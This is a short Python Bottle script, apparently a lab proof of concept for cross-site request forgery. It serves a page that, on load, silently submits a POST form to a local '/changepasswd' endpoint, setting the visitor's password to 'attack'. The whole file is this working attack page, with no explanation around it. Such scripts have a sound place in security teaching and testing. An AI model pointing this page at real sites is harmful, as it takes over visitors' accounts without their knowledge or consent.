from bottle import route,run,request

target_url="http://localhost:8000/changepasswd"

@route("/")
def index():
	res='<body onload="document.forms[0].submit()">'
	res+='<form method="POST" action={}>'.format(target_url)#*args, **kwargs
	res+='<input type="text" name="password" value="attack">'
	res+='</form>'
	res+='</body>'
	return res


if __name__=="__main__":
	run(host="0.0.0.0",port="8080",debug=True)